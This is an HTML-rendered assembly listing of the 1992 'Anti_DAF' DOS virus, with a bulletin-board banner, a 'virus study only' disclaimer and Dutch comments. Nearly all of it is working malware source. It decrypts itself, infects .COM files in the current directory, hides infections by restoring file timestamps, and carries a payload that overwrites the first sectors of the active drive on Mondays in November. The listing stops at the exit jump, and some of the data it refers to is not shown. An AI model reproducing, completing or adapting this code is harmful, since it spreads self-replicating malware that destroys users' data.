<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>ANTI_DAF.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=] For All Your H/P/A/V Files [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]    SysOp: Peter Venkman    [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]                            [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]      +31.(o)79.426o79      [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=]  P E R F E C T  C R I M E  [=-                     ;</span><span class="sc0">
</span><span class="sc1">;                     -=][][][][][][][][][][][][][][][=-                     ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;</span><span class="sc0">
</span><span class="sc1">; Around Among the General Public. It Will be Very Useful for Learning how   ;</span><span class="sc0">
</span><span class="sc1">; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;</span><span class="sc0">
</span><span class="sc1">; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;</span><span class="sc0">
</span><span class="sc1">; Experience can Turn it Into a far More Malevolent Program Than it Already  ;</span><span class="sc0">
</span><span class="sc1">; Is. Keep This Code in Responsible Hands!                                   ;</span><span class="sc0">
</span><span class="sc1">;                                                                            ;</span><span class="sc0">
</span><span class="sc1">;****************************************************************************;</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*   The Anti_DAF Virus                                                     *</span><span class="sc0">
</span><span class="sc1">;*                                                                          *</span><span class="sc0">
</span><span class="sc1">;*   Assembled with Tasm 2.5                            *</span><span class="sc0">
</span><span class="sc1">;*                                                                          *</span><span class="sc0">
</span><span class="sc1">;*   (c) 1992 Dark Helmet &amp; The Virus Research Centre, The Netherlands      *</span><span class="sc0">
</span><span class="sc1">;*   The author takes no responsibilty for any damages caused by the virus  *</span><span class="sc0">
</span><span class="sc1">;*                                                                          *</span><span class="sc0">
</span><span class="sc1">;*   Special greetings and thanx to :                                       *</span><span class="sc0">
</span><span class="sc1">;*   Glenn Benton, XSTC for their nice source and viruses,          *</span><span class="sc0">
</span><span class="sc1">;*   Peter Venkman for his BBS, Guns and Roses for their great music,       *</span><span class="sc0">
</span><span class="sc1">;*   and al the other viruswriters...                       *</span><span class="sc0">
</span><span class="sc1">;*                                                                          *</span><span class="sc0">
</span><span class="sc1">;*   "Dark Helmet strikes back..."                              *</span><span class="sc0">
</span><span class="sc1">;*                                                                          *</span><span class="sc0">
</span><span class="sc1">;*--------------------------------------------------------------------------*</span><span class="sc0">
</span><span class="sc1">;*                                      *</span><span class="sc0">
</span><span class="sc1">;*   NOTE : This virus will overwrite the first sectors of the active drive *</span><span class="sc0">
</span><span class="sc1">;*          on any monday in November.                                      *</span><span class="sc0">
</span><span class="sc1">;*                                      *   </span><span class="sc0">
</span><span class="sc1">;*   Coming soon : CIVIL WAR II                             *</span><span class="sc0">
</span><span class="sc1">;*                                      *</span><span class="sc0">
</span><span class="sc1">;*--------------------------------------------------------------------------*</span><span class="sc0">
</span><span class="sc1">;*                                                                          *</span><span class="sc0">
</span><span class="sc1">;*  Het Anti-DAF virus is hoofzakelijk gebaseerd op The Navigator virus     *</span><span class="sc0">
</span><span class="sc1">;*  De encryptie die bij Anti-DAF gebruikt wordt is gebaseerd               *</span><span class="sc0">
</span><span class="sc1">;*  op de encryptie zoals deze door Glenn Benton gebruikt is            *</span><span class="sc0">
</span><span class="sc1">;*  bij het 'RTL4/Wedden dat virus'.                                        *</span><span class="sc0">
</span><span class="sc1">;*  Om de controleren of een file geinfecteerd is worden de 4e, 5e en 6e    *</span><span class="sc0">
</span><span class="sc1">;*  bytes aan het begin gebruikt.                       *</span><span class="sc0">
</span><span class="sc1">;*                                      *</span><span class="sc0">
</span><span class="sc1">;*   XOR de 4e en 5e byte                           *</span><span class="sc0">
</span><span class="sc1">;*   Verhoog resultaat met 1                            *</span><span class="sc0">
</span><span class="sc1">;*   Vergelijk met 6e byte                              *</span><span class="sc0">
</span><span class="sc1">;*                                      *</span><span class="sc0">
</span><span class="sc1">;*   Is het resultaat gelijk dan is de file al besmet, de 6e byte word ook  *</span><span class="sc0">
</span><span class="sc1">;*   voor de decryptie gebruikt.                        *</span><span class="sc0">
</span><span class="sc1">;*   Verlaag deze waarde met 1 en je hebt de sleutel zoals deze bij de      *</span><span class="sc0">
</span><span class="sc1">;*   decrypty in gebruik is.                            *</span><span class="sc0">
</span><span class="sc1">;*   Het 4e byte word bepaald uit de lengte van de file + 1.                *</span><span class="sc0">
</span><span class="sc1">;*   De 5e byte word bepaald door het aantal seconden van           *</span><span class="sc0">
</span><span class="sc1">;*   de systeemtijd te pakken.                          * </span><span class="sc0">
</span><span class="sc1">;*                                                                          *</span><span class="sc0">
</span><span class="sc1">;*   Dark Helmet                                *</span><span class="sc0">
</span><span class="sc1">;*                                      *</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

        </span><span class="sc9">.Radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">Anti_DAF</span><span class="sc0">        </span><span class="sc9">Segment</span><span class="sc0">
        </span><span class="sc9">Assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Anti_DAF</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Anti_DAF</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">len</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">
</span><span class="sc5">vir_len</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">vir_start</span><span class="sc0"> 

</span><span class="sc5">Dummy</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">Key</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">Begin</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">          </span><span class="sc1">; IP op stack</span><span class="sc0">

</span><span class="sc5">Virus</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">              </span><span class="sc1">; Haal IP van Stack </span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">109h</span><span class="sc0">         
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">vir_start</span><span class="sc4">+[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; voor decryptie     </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vir_len</span><span class="sc0">          </span><span class="sc1">; lengte decryptie gedeelte </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">105h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; haal sleutel op</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                          </span><span class="sc1">; sleutel met 1 verminderen</span><span class="sc0">
                        </span><span class="sc1">; voor decryptie</span><span class="sc0">

</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">; decrypt virus</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">           
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypt</span><span class="sc0">

</span><span class="sc5">vir_start</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fe00h</span><span class="sc0">           </span><span class="sc1">; verplaats DTA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">restore_begin</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">            </span><span class="sc1">; herstel begin programma</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">          </span><span class="sc1">;kijk of het een maandag    </span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;in november is</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">00bh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_activate</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_activate</span><span class="sc0">

</span><span class="sc5">activate</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">          </span><span class="sc1">; activeer het virus :-)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">text</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; druk text af</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">          </span><span class="sc1">; vraag drive op</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; overschrijf eerste sectors</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">; van huidige drive</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            
            </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">26h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">



</span><span class="sc5">no_activate</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">com_mask</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; zoekt eerste .COM program</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc0">         </span><span class="sc1">; in directorie</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Open_file</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03d02h</span><span class="sc0">           </span><span class="sc1">; open gevonden file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fe1eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">Read_date</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05700h</span><span class="sc0">           </span><span class="sc1">;lees datum/tijd file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">             </span><span class="sc1">;en bewaar deze</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">date</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">time</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">Check_infect</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; kijkt of al geinfecteerd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]+</span><span class="sc2">4</span><span class="sc0"> 
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]+</span><span class="sc2">5</span><span class="sc0">   
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">infect_file</span><span class="sc0">

</span><span class="sc5">Close_file</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; sluit file </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Next_file</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">          </span><span class="sc1">; zoekt volgende file</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0"> </span><span class="sc5">open_file</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">            </span><span class="sc1">; geen meer gevonden,</span><span class="sc0">
                        </span><span class="sc1">; ga naar exit</span><span class="sc0">

</span><span class="sc5">Infect_file</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc2">0fe1ah</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; lees lengte van file in</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">lenght</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">; sla lengte op voor sprong</span><span class="sc0">
                        </span><span class="sc1">; instructie zodadelijk </span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; verhoog AL, eerste key </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key1</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">            
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">          </span><span class="sc1">; vraag systeemtijd op</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">key2</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">        </span><span class="sc1">; gebruik seconden voor tweede</span><span class="sc0">
                        </span><span class="sc1">; key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">key1</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; derde sleutel en sleutel</span><span class="sc0">
                        </span><span class="sc1">; voor encrypty is een xor</span><span class="sc0">
                        </span><span class="sc1">; van key1 en key2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sleutel</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">vir_start</span><span class="sc4">+[</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0fd00h</span><span class="sc0">           </span><span class="sc1">; encrypt hele zooi aan het</span><span class="sc0">
                        </span><span class="sc1">; einde van het segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vir_len</span><span class="sc0"> 
        
</span><span class="sc5">Encrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">; de encryptie  </span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">sleutel</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">encrypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc5">sleutel</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sleutel</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">Write_jump</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">04200h</span><span class="sc0">              </span><span class="sc1">; schrijf de jmp die het</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">move_pointer</span><span class="sc0">          </span><span class="sc1">; die het virus aan het begin    </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">             </span><span class="sc1">; maakt  </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">jump</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; schrijf de offset die de jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">; maakt</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">lenght</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">           </span><span class="sc1">; schrijf de sleutels weg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">key1</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                
</span><span class="sc5">Write_virus</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">            </span><span class="sc1">; schrijf virus gedeelte</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">move_pointer</span><span class="sc0">       </span><span class="sc1">; tot vir_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">len</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">vir_len</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">begin</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">          </span><span class="sc1">; schrijf het encrypte virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">vir_len</span><span class="sc0">          </span><span class="sc1">; achter de rest van het virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fd00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">restore_date</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc5">date</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; herstel datum/tijd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">time</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; geinfecteerde file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">handle</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05701h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">            </span><span class="sc1">; continu met orgineel </span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">; orgineel programma</span><span class="sc0">

